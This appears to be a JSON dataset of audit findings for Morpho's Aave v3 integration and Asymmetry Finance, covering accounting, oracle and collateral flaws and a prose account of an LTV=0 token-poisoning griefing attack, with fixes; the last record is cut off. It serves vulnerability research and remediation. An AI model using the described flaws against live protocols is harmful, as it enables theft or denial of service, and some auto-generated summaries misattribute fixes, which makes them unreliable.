    {
      "id": "16223",
      "title": "Repaying with ETH does not refund excess",
      "impact": "HIGH",
      "content": "## Security Report\n\n## Severity\n**High Risk**\n\n## Context\n**File:** WETHGateway.sol  \n**Line:** 67\n\n## Description\nUsers can repay WETH Morpho positions with ETH using the WETHGateway. The specified repay amount will be wrapped to WETH before calling the Morpho function to repay the WETH debt. However, the Morpho repay function only pulls in `Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount)`. If the user specified an amount larger than their debt balance, the excess will be stuck in the WETHGateway contract.\n\nThis might be especially confusing for users because the standard `Morpho.repay` function does not have this issue, and they might be used to specifying a large, round value to be sure to repay all principal and accrued debt once the transaction is mined.\n\n## Recommendation\nCompute the difference between the specified amount and the amount that was actually repaid, and refund it to the user.\n\n```solidity\nuint256 excess = msg.value - _MORPHO.repay(_WETH, msg.value, onBehalf);\n_unwrapAndTransferETH(excess, msg.sender);\n```\n\nFurthermore, consider adding skim functions that can send any stuck ERC20 or native balances to a recovery account, for example, the Morpho treasury (if defined).\n\n## Fixes\n**Morpho:** Fixed in PR 588 and PR 605.  \n**Spearbit:** Fixed.",
      "summary": "\nThis bug report details an issue with the WETHGateway contract in which users can repay WETH Morpho positions with ETH. If the user specifies an amount larger than their debt balance, the excess will be stuck in the WETHGateway contract. This could be confusing for users as the standard Morpho.repay function does not have this issue.\n\nThe recommendation to fix this issue is to compute the difference between the specified amount and the amount that was actually repaid, and refund it to the user. Additionally, skim functions can be added to send any stuck ERC20 or native balances to a recovery account, such as the Morpho treasury (if defined).\n\nThis issue has been fixed in PR 588 and PR 605, and Spearbit has also fixed the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16222",
      "title": "Accounting issue when repaying P2P fees while having a borrow delta",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- `PositionsManagerInternal.sol#L308`\n- `DeltasLib.sol#L88`\n- `MarketSideDeltaLib.sol#L63`\n\n## Description\nWhen repaying debt on Morpho, any potential borrow delta is matched first. Repaying the delta should involve both decreasing the `scaledDelta` as well as decreasing the `scaledP2PAmount` by the matched amount[^1]. However, the `scaledP2PAmount` update is delayed until the end of the repay function. The following `repayFee` call then reads the un-updated `market.deltas.borrow.scaledP2PAmount` storage variable, leading to a larger estimation of the P2P fees that can be repaid.\n\nThe excess fee that is repaid will stay in the contract and not be accounted for, when it should have been used to promote borrowers, increase idle supply, or demote suppliers. For example, there could now be P2P suppliers that should have been demoted but are not, and in reality, don't have any P2P counterparty, leaving the entire accounting system in a broken state.\n\n### Example\n(All values are in underlying amounts for brevity.)\nImagine a borrow delta of 1000, `borrow.scaledP2PTotal` = 10,000, `supply.scaledP2PTotal` = 8,000, so the repayable fee should be \\( (10,000 - 1000) - (8,000 - 0) = 1,000 \\). Now a P2P borrower wants to repay 3000 debt:\n\n1. **Pool repay:** No pool repay as they have no pool borrow balance.\n2. **Decrease P2P borrow delta:** `decreaseDelta` is called which sets `market.deltas.borrow.scaledDelta = 0` (but does not update `market.deltas.borrow.scaledP2PAmount` yet!) and returns `matchedBorrowDelta = ...`\n3. **Repay fee is called:** It computes \\( (10,000 - 0) - (8,000 - 1,000) = 2,000 \\). They repay more than the actual fee.\n\n## Recommendation\nOne way to resolve this issue is by having `MarketSideDeltaLib.decreaseDelta` decrease the `deltas.borrow.scaledP2PTotal` by the scaled repaid amount. The `market.deltas.decreaseP2P` call then only needs to reduce the P2P delta by `vars.toSupply + idleSupplyIncrease`. Consider adding tests for a scenario that has both a positive borrow delta and fees to repay.\n\n## Morpho\nFixed in PR 565.\n\n## Spearbit\nFixed, the `scaledP2PTotal` is now decreased before calling `repayFee`.",
      "summary": "\nThis bug report concerns the repayment of debt on Morpho. When repaying debt, the scaledP2PAmount update is delayed until the end of the repay function. This leads to a larger estimation of the P2P fees that can be repaid, resulting in excess fees that stay in the contract and are not accounted for. \n\nAn example is given of a borrower wanting to repay 3000 debt. When the repayFee call is made, it computes a repay fee of 2000, more than the actual fee of 1000.\n\nThe bug was fixed in PR 565, by having MarketSideDeltaLib.decreaseDelta decrease the deltas.borrow.scaledP2PTotal by the scaled repaid amount. Additionally, Spearbit fixed the issue by decreasing the scaledP2PTotal before calling repayFee. Tests were also added for a scenario with both a positive borrow delta and fees to repay.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16221",
      "title": "RewardsManager does not take in account users that have supplied collateral directly to the pool",
      "impact": "HIGH",
      "content": "## Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n`RewardsManager.sol#L436`\n\n## Description\nInside `RewardsManager._getUserAssetBalances`, Morpho is calculating the amount of the supplied and borrowed balance for a specific user. In the current implementation, Morpho is ignoring the amount that the user has supplied as collateral directly into the Aave pool. As a consequence, the user will be eligible for fewer rewards or even zero in the case where he/she has supplied only collateral.\n\n## Recommendation\nWhen `asset == market.aToken`, `userAssetBalances[i].balance` should be equal to:\n```solidity\n_MORPHO.scaledPoolSupplyBalance(market.underlying, user) + _MORPHO.scaledCollateralBalance(market.underlying, user)\n```\n\n## Morpho\nRecommendation implemented in PR 587.\n\n## Spearbit\nFixed.",
      "summary": "\nThis bug report is about a high-risk issue in the RewardsManager.sol#L436 of the Morpho system. The system is not taking into account the amount of collateral that the user has supplied directly into the Aave pool when calculating the amount of supplied and borrowed balance for a user. As a result, the user is eligible for fewer rewards or even zero in the case where they have only supplied collateral. \n\nThe recommendation given is that when asset is equal to market.aToken, userAssetBalances[i].balance should be equal to _MORPHO.scaledPoolSupplyBalance(market.underlying, user) + _MORPHO.scaledCollateralBalance(market.underlying, user). Morpho has implemented this recommendation in PR 587 and it has been fixed by Spearbit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16220",
      "title": "Morpho's logic to handle LTV = 0 AToken diverges from the Aave logic and could decrease the user's HF/borrowing power compared to what the same user would have on Aave",
      "impact": "HIGH",
      "content": "## High Risk Severity Report\n\n## Context\n- **Files Involved:**\n  - MorphoInternal.sol#L324\n  - PositionsManager.sol#L118\n  - PositionsManager.sol#L209-L211\n  - PositionsManagerInternal.sol#L176-L192\n\n## Description\nThe current implementation of Morpho has a specific logic to handle the scenario where Aave sets the asset's LTV to zero. The handling of this situation can be observed in the `_assetLiquidityData` function:\n\n```solidity\nfunction _assetLiquidityData(address underlying, Types.LiquidityVars memory vars)\n  internal\n  view\n  returns (uint256 underlyingPrice, uint256 ltv, uint256 liquidationThreshold, uint256 tokenUnit)\n{\n  // other function code...\n  // If the LTV is 0 on Aave V3, the asset cannot be used as collateral to borrow upon a breaking withdraw.\n  // In response, Morpho disables the asset as collateral and sets its liquidation threshold to 0 and the governance should warn users to repay their debt.\n  if (config.getLtv() == 0) return (underlyingPrice, 0, 0, tokenUnit);\n  // other function code...\n}\n```\n\nThe `_assetLiquidityData` function is used to calculate the number of assets a user can borrow and the maximum debt a user can reach before being liquidated. Those values are then used to calculate the user Health Factor. The Health Factor is used to:\n- Calculate both if a user can be liquidated and in which percentage the collateral can be seized.\n- Calculate if a user can withdraw part of his/her collateral.\n\nThe debt and borrowable amount are used in the borrowing operations to know if a user is allowed to borrow the specified amount of tokens.\n\nOn Aave, this situation is handled differently. There is a specific distinction between when the liquidation threshold is equal to zero and when the Loan to Value of the asset is equal to zero. Note that Aave enforces (on the configuration setter of a reserve) that LTV must be <= liquidationThreshold, which implies that if the LT is zero, the LTV must be zero.\n\n1. **Case 1: Liquidation Threshold equal to zero**\n   - The collateral is not counted as collateral. This behavior is followed by Morpho, but Morpho also applies this when the Liquidation Threshold is greater than zero.\n\n2. **Case 2: LT > 0, LTV = 0**\n   - Aave counts the collateral as part of the user's total collateral but does not increase the user's borrowing power. This influences the user's health factor, but not as impactfully as Morpho's implementation.\n\nIn conclusion, when the LTV of an asset is equal to zero, Morpho does not apply the same logic as Aave, which leads to:\n- Denying a user's collateral withdrawal (while an Aave user could have done it).\n- Denying a user's borrow (while an Aave user could have done it).\n- Making a user liquidable (while an Aave user could have been healthy).\n- Increasing the possibility to allow the liquidator to seize the full collateral of the borrower (instead of 50%).\n\n## Recommendation\nWhile the motivation for Morpho's approach is understandable due to the side effects of an LTV = 0 asset, Morpho should evaluate all possible alternative solutions to avoid worsening the user experience in this edge case scenario. If there are no other options, Morpho should at least:\n- Add in-depth documentation in the code about this decision and its potential side effects on user positions.\n- Detail this behavior in their online documentation and warn users.\n\n### Morpho\n- Addressed in PR 569.\n\n### Spearbit\nThe PR implements a mechanism that allows the Morpho DAO to set an asset as collateral/not collateral on Morpho and Aave. This implementation is necessary to handle the edge case where an asset's LTV is set to zero by the Aave Governance.\n\nWithout setting an LTV = 0 asset as non-collateral on Aave, some core mechanics of Morpho's protocol would break. While this PR resolves this specific issue, all the side effects described in the issue still remain true.\n\nWhen an asset is set to `isCollateral = false` on Morpho or has LTV = 0 on Aave, Morpho's user's LTV and HF will decrease because Morpho is treating that asset as non-collateral. This behavior has the following consequences for Morpho's users:\n- User could be unable to borrow anymore (due to reduced LTV).\n- User could not be able to withdraw anymore (due to reduced HF).\n- User could be liquidable (due to reduced HF).\n- Increase the possibility, in case of liquidation, to liquidate the whole debtor's collateral (due to reduced HF).\n- While the asset is not treated as collateral anymore, it can still be seized during the liquidation process.\n\nNote that in the case of LTV = 0, the same user on Aave would have a different situation because, in this specific scenario, only the LTV is reduced and not the HF.\n\nThe PR lacks documentation of this behavior and the differences between Morpho and Aave in this scenario. It also lacks a well-documented procedure for users to follow both before and after the LTV = 0 edge case to avoid liquidation or incur any of those side effects once Morpho has set the asset as not collateral or Aave has set the LTV to zero.\n\nBecause the PR does not resolve the user's side effects, Morpho should consider documenting them and providing a well-documented procedure for the issue's scenario. Morpho should also consider implementing UI/UX mechanisms to properly alert users to take necessary actions for assets that will soon be set to `isCollateral = false` on Morpho or LTV = 0 on Aave.\n\n### Status\nMarked as Acknowledged.",
      "summary": "\nThis bug report is about the different ways Morpho and Aave handle an asset with a Loan to Value (LTV) set to zero. Morpho sets the asset's liquidation threshold to zero and the governance should warn users to repay their debt. This affects the user's Health Factor (HF) and borrowing power. On Aave, the asset is still counted as collateral but the user's borrowing power is not increased. This means that Morpho users may not be able to withdraw collateral, borrow, or be liquidated, while an Aave user could have done it. \n\nThe report recommends that Morpho evaluates alternative solutions to avoid creating a worse user experience in this edge case scenario. If not, they should at least add in-depth documentation in the code about this decision and all the side effects that it could have on user positions. They should also detail this behavior on their online documentation and warn the user. \n\nMorpho addressed this issue in a Pull Request (PR) 569. The PR implements a mechanism that allows the Morpho DAO to set an asset as collateral/not collateral on Morpho and Aave. This is needed to handle the edge case where an asset LTV is set to zero by the Aave Governance. However, the PR is lacking documentation of this behavior and the differences between Morpho and Aave in this scenario. It is also lacking a well documented procedure that the users should follow both before and after the LTV = 0 edge case to avoid being liquidated or incur in any of the side effects. \n\nMorpho should consider documenting the user's side effects, providing a well-documented procedure, and implementing some UI/UX mechanism that properly alerts users to take those actions. This bug report has been marked as Acknowledged.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16219",
      "title": "Isolated assets are treated as collateral in Morpho",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\n- `aave-v3/SupplyLogic.sol#L78`\n- `aave-v3/ValidationLogic.sol#L711`\n- `aave-v3/UserConfiguration.sol#L194`\n- `PositionsManagerInternal.sol#L408`\n\n## Description\nAave-v3 introduced isolation assets and isolation mode for users:\n> \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\"\n\nThe Morpho contract is intended not to be in isolation mode to avoid its restrictions. Supplying an isolated asset to Aave while there are already other (non-isolated) assets set as collateral will simply supply the asset to earn yield without setting it as collateral. However, Morpho will still set these isolated assets as collateral for the supplying user. Morpho users can borrow any asset against them, which should not be possible:\n- Isolated assets are by definition riskier when used as collateral and should only allow borrowing up to a specific debt ceiling.\n- The borrows are not backed on Aave as the isolated asset is not treated as collateral there, lowering the Morpho Aave position's health factor and putting the system at risk of liquidation on Aave.\n\n## Recommendation\nThe current code assumes that a supplied asset is always set as collateral on Aave whenever a `supplyCollateral` action with its `_POOL.supplyToPool` call succeeds. \n\nIn addition to Morpho can end up in isolation mode which ensures that the system does not end up in isolation mode, reject isolated assets for `supplyCollateral` calls. Alternatively, check that the supplied asset is indeed set as collateral on Aave after the `_POOL.supplyToPool(underlying, amount)` call.\n\n## Morpho: \nAddressed with PR 569.\n\nMore information on edge cases and how we would handle can be found [here](link-to-more-information).\n\n## Spearbit: \nFixed.",
      "summary": "\nThis bug report is related to Aave-v3, which introduced isolation assets and isolation mode for users. The Morpho contract is intended not to be in isolation mode to avoid its restrictions. However, Morpho will still set these isolated assets as collateral for the supplying user and this should not be possible. As isolated assets are riskier when used as collateral and should only allow borrowing up to a specific debt ceiling, this could potentially put the system at risk of liquidation on Aave.\n\nThe current code assumes that a supplied asset is always set as collateral on Aave whenever a supplyCollateral action with its _POOL.supplyToPool call succeeds. As such, the recommendation is to either reject isolated assets for supplyCollateral calls or check that the supplied asset is indeed set as collateral on Aave after the _POOL.supplyToPool(underlying, amount) call.\n\nMorpho addressed the issue with PR 569 and Spearbit fixed the issue. More information on edge cases and how to handle them can be found on the related website.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16218",
      "title": "Morpho is not correctly handling the asset price in _getAssetPrice when isInEMode == true but priceSource isaddres(0)",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\n`MorphoInternal.sol#L524-L536`\n\n## Description\nThe current implementation of `_getAssetPrice` returns the asset's price based on the value of `isInEMode`.\n\n```solidity\nfunction _getAssetPrice(address underlying, IAaveOracle oracle, bool isInEMode, address priceSource)\ninternal\nview\nreturns (uint256)\n{\n    if (isInEMode) {\n        uint256 eModePrice = oracle.getAssetPrice(priceSource);\n        if (eModePrice != 0) return eModePrice;\n    }\n    return oracle.getAssetPrice(underlying);\n}\n```\n\nAs you can see from the code, if `isInEMode` is equal to true, they call `oracle.getAssetPrice` no matter what the value of `priceSource`, which could be `address(0)`.\n\nIf we look inside the AaveOracle implementation, we could assume that in the case where the asset is `address(0)` (in this case, Morpho passes `priceSource` to the `_getAssetPrice` parameter), it would probably return `_fallbackOracle.getAssetPrice(asset)`.\n\nIn any case, the Morpho logic diverges compared to what Aave implements. On Aave, if the user is not in e-mode, the e-mode oracle is `address(0)` or the asset's e-mode is not equal to the user's e-mode (in case the user is in e-mode), Aave always uses the asset price of the underlying and not the one in the e-mode `priceSource`.\n\nThe impact is that if no explicit e-mode oracle has been set, Morpho might revert in price computations, breaking liquidations, collateral withdrawals, and borrows, if the fallback oracle does not support the asset, or it will return the fallback oracle's price, which is different from the price that Aave would use.\n\n## Recommendation\nMorpho should use and return the e-mode price `eModePrice` only when `isInEMode` and `priceSource != address(0)`.\n\n- **Morpho:** Recommendation implemented in PR 590.\n- **Spearbit:** Fixed.",
      "summary": "\nThis bug report is about the function _getAssetPrice in MorphoInternal.sol which returns the asset's price based on the value of isInEMode. The issue is that if isInEMode is true and priceSource is address(0), it would call the oracle.getAssetPrice method regardless. This is different from what Aave implements, which would use the asset price of the underlying if the user is not in e-mode or the asset's e-mode is not equal to the user's e-mode. The impact is that if no explicit eMode oracle has been set, Morpho might revert in price computations, causing liquidations, collateral withdrawals, and borrows to fail.\n\nThe recommendation is that Morpho should use and return the e-mode price eModePrice only when isInEMode and priceSource are not equal to address(0). This recommendation has been implemented in PR 590 and the bug has been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16217",
      "title": "Morpho is vulnerable to attackers sending LTV = 0 collateral tokens, supply/supplyCollateral, borrow and liquidate operations could stop working",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context:\n- **Morpho related context:** \n  - PositionsManager.sol#L120-L121\n  - PositionsManager.sol#L180\n  - PositionsManager.sol#L213\n  - PositionsManager.sol#L261\n\n- **Aave related context:** \n  - ValidationLogic.sol#L605-L608\n  - SupplyLogic.sol#L146-L156\n  - SupplyLogic.sol#L194-L204\n  - SupplyLogic.sol#L280-L290\n\n## Description:\nWhen an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, these operations could revert:\n\n1. **Withdraw:** If the asset withdrawn is collateral, and the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0.\n2. **Transfer:** If the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0, the operation will revert.\n3. **Set the reserve of an AToken as not collateral:** If the AToken you are trying to set as non-collateral is an AToken with LTV > 0, the operation will revert.\n\nNote that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, depending on the operation itself (like, for example, an HF check).\n\nIn the attack scenario, the bad actor could simply supply an underlying that is associated with an LTV = 0 AToken and transfer it to the Morpho contract. If the victim does not own any balance of the asset, it will be set as collateral, and the victim will suffer from all the side effects previously explained.\n\nWhile a \"normal\" Aave user could simply withdraw, transfer, or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken,\" part of the Morpho mechanics will break.\n\n- Morpho's users could not be able to withdraw both collateral and \"pure\" supply.\n- Morpho's users could not be able to borrow.\n- Morpho's users could not be able to liquidate.\n- Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0.\n\n## Recommendation:\nThere are multiple possible solutions that could be explored by Morpho. Each of the solutions has pros, cons, and possible side effects that should be carefully evaluated.\n\nOne possible solution that Morpho could explore after elaborating all the pros/cons/side effects and possible problems could be to allow the DAO to set the \"poison asset\" as non-collateral. If the asset is part of Morpho's markets, they must ensure that Morpho's Aave position remains healthy. If the asset is not part of Morpho's markets, there should be no problem regarding the health factor.\n\nA second possible solution could be to allow the DAO to withdraw/transfer the \"poisoned token\" if the token does not belong to an existing market (this is to prevent touching the user's assets). If the token belongs to Morpho's market, the solution is trickier and should probably fall back to the first solution without touching the user's balance in an active way.\n\nBecause of how Aave behaves, it should be noted that if Morpho withdraws/transfers all the balance of the LTV = 0 asset, the attacker can repeat the griefing attack by transferring again the \"poisoned asset\" to Morpho that would be re-enabled as collateral by default. Because of this, probably the second solution should be avoided.\n\nIt should be noted that the problems described above could exist for assets that already belong to the existing Morpho market. This scenario will be handled in a separate issue.\n\n## Morpho:\n- Fixed by P5 569 followed by P5 768.\n- In case of emergency, we'll follow the guidelines written in this [notion link](URL).\n- At deployment, we sent aTokens of all markets to the Morpho contract and disabled them as collateral on the pool so that this attack cannot be performed on the current listed assets on Aave.\n- Also, Aave is planning an upgrade that would fix this issue.\n\n## Spearbit:\n- Fixed.",
      "summary": "\nThis bug report is about the risk of row and liquidate operations potentially not working when an AToken has an LTV (Loan-to-Value) of 0. This could happen when a bad actor transfers an underlying asset associated with an AToken with an LTV of 0 to the Morpho contract. If the victim does not own any balance of the asset, it will be set as collateral and the victim will suffer from all the side effects previously explained, such as not being able to withdraw collateral and pure supply, borrow, liquidate, or claim rewards.\n\nMorpho has identified two possible solutions for this issue. The first solution is to allow the DAO to set the \"poisoned asset\" as non-collateral. The second solution is to allow the DAO to withdraw or transfer the \"poisoned token\" if the token does not belong to an existing market. However, this second solution should be avoided as the attacker can repeat the griefing attack.\n\nAt deployment, Morpho sent aTokens of all markets to the Morpho contract and disabled them as collateral on the pool. Aave is also planning an upgrade to fix this issue. Spearbit has also fixed the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16216",
      "title": "Side effects of LTV = 0 assets: Morpho's users will not be able to withdraw (collateral and \"pure\" supply), borrow and liquidate",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\n- PositionsManager.sol#L120-L121\n- PositionsManager.sol#L180\n- PositionsManager.sol#L213\n- PositionsManager.sol#L261\n\n## Description\nWhen an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, operations could revert.\n\n1. **Withdraw**: If the asset withdrawn is collateral, and the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0.\n2. **Transfer**: If the sender is using the asset as collateral, is borrowing something, and the asset transferred is an AToken with LTV > 0, the operation will revert.\n3. **Set the reserve of an AToken as not collateral**: If the AToken you are trying to set as non-collateral is an AToken with LTV > 0, the operation will revert.\n\nNote that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, depending on the operation itself (like, for example, an HF check).\n\nWhile a \"normal\" Aave user could simply withdraw, transfer, or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken,\" part of the Morpho mechanics will break.\n\n- Morpho's users could not be able to withdraw both collateral and \"pure\" supply.\n- Morpho's users could not be able to borrow.\n- Morpho's users could not be able to liquidate.\n- Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0.\n\n## Recommendation\nMorpho should avoid listing ATokens with LTV = 0 or ATokens that soon will be LTV = 0. \n\nIn case Morpho has already created markets for tokens that will be configured with LTV = 0, a well-detailed and tested procedure to reach a state that prevents the listed side effects should be applied as soon as possible. The final goal of Morpho should be to arrive at a point where those markets are:\n\n- Paused.\n- Have no supplied/borrow balance owned by the users.\n- Have only 1 wei of collateral balance owned by Morpho.\n- Have the reserve set as non-collateral while remaining overall healthy.\n\nThe last two points are to avoid possible griefing attacks.\n\n## Morpho\nFixed in PR 569.\n\n## Spearbit\nThe fix implements a mechanism that allows Morpho to set an asset as collateral/not collateral on Morpho and Aave. This implementation is needed to handle the edge case where an asset's LTV is set to zero by the Aave Governance. \n\nWithout setting an LTV = 0 asset as non-collateral on Aave, some core mechanics of Morpho's protocol would break. While this PR solves this specific issue, all the side effects described in the issue still remain true.\n\nWhen an asset is set to `isCollateral = false` on Morpho or has `LTV = 0` on Aave, Morpho's user's LTV and HF will be reduced because Morpho is treating that asset not as collateral anymore. The behavior has the following consequences for Morpho's users:\n\n- User could not be able to borrow anymore (because of reduced LTV).\n- User could not be able to withdraw anymore (because of reduced HF).\n- User could be liquidable (because of reduced HF).\n- Increase the possibility, in case of liquidation, to liquidate the whole debtor's collateral (because of reduced HF).\n- While the asset is not treated as collateral anymore, it can still be sized during the liquidation process.\n\nNote that in case of `LTV = 0`, the same user on Aave would have a different situation because on Aave, in this specific scenario, only the LTV is reduced and not the HF.\n\nThe PR is lacking documentation of this behavior and the differences between Morpho and Aave in this scenario. The PR is also lacking a well-documented procedure that the users should follow both before and after the LTV = 0 edge case to avoid being liquidated or incur in any of those side effects once Morpho's has set the asset as not-collateral or Aave has set the LTV to zero.\n\nBecause the PR does not solve the user's side effects, Morpho should consider documenting them and provide a well-documented procedure that the users should follow for the issue's scenario. Morpho should also consider implementing some UI/UX mechanism that properly alerts users to take those actions for assets that will soon be set to `isCollateral = false` on Morpho or `LTV = 0` on Aave.",
      "summary": "\nThis bug report is about an issue related to the operations of Aave, a decentralized finance protocol. When an AToken has a Loan-to-Value (LTV) ratio of 0, Aave restricts the usage of some operations. This includes withdrawing, transferring, and setting the reserve of an AToken as not collateral. This issue affects the Morpho protocol, as users cannot withdraw their collateral, borrow, liquidate, or claim rewards via claimRewards if one of the rewards is an AToken with an LTV greater than 0. \n\nThe recommended solution is for Morpho to avoid listing ATokens with an LTV of 0 or ATokens that will soon be LTV 0. If Morpho has already created markets for tokens that will be configured with LTV 0, a procedure to reach a state that prevents the listed side effects should be applied as soon as possible. The goal should be to arrive at a point where the markets are paused, have no supplied/borrow balance owned by users, have only 1 wei of collateral balance owned by Morpho, and have the reserve set as non-collateral while remaining overall healthy. \n\nThe bug was fixed in PR 569, which implements a mechanism that allows Morpho to set an asset as collateral/not collateral on Morpho and Aave. However, the PR is lacking documentation of the behavior and the differences between Morpho and Aave in this scenario, as well as a well-documented procedure that users should follow before and after the LTV = 0 edge case to avoid being liquidated or incurring any side effects.\n\nMorpho should consider documenting the user side effects and providing a well-documented procedure that users should follow for the issue's scenario. They should also consider implementing some UI/UX mechanism that properly alerts users to take those actions for assets that will soon be set to isCollateral = false on Morpho or LTV = 0 on Aave.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "19979",
      "title": "[G-14] Save loop calls",
      "impact": "GAS",
      "content": "\nInstead of calling `derivatives[i]` 3 times in each loop for fetching data, it can be saved as a variable.\n\n```solidity\nfor (uint i = 0; i < derivativeCount; i++)\n            underlyingValue +=\n                (derivatives[i].ethPerDerivative(derivatives[i].balance()) *\n                    derivatives[i].balance()) /\n                10 ** 18;\n```\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L71-L75\n\n\n```solidity\n        for (uint256 i = 0; i < derivativeCount; i++) {\n            // withdraw a percentage of each asset based on the amount of safETH\n            uint256 derivativeAmount = (derivatives[i].balance() *\n                _safEthAmount) / safEthTotalSupply;\n            if (derivativeAmount == 0) continue; // if derivative empty ignore\n            derivatives[i].withdraw(derivativeAmount);\n        }\n```\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L113-L119\n\n\n```solidity\n        for (uint i = 0; i < derivativeCount; i++) {\n            if (derivatives[i].balance() > 0)\n                derivatives[i].withdraw(derivatives[i].balance());\n        }\n```\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L140-L143\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/235#issuecomment-1502246753)**\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19978",
      "title": "[G-13] Use solidity version 0.8.19 to gain some gas boost",
      "impact": "GAS",
      "content": "\nUpgrade to the latest solidity version 0.8.19 to get additional gas savings.<br>\nSee latest release for reference: https://blog.soliditylang.org/2023/02/22/solidity-0.8.19-release-announcement/\n\n### Proof Of Concept\n\n```solidity\npragma solidity ^0.8.13;\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L2\n\n```solidity\npragma solidity ^0.8.13;\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L2\n\n```solidity\npragma solidity ^0.8.13;\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L2\n\n```solidity\npragma solidity ^0.8.13;\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L2\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
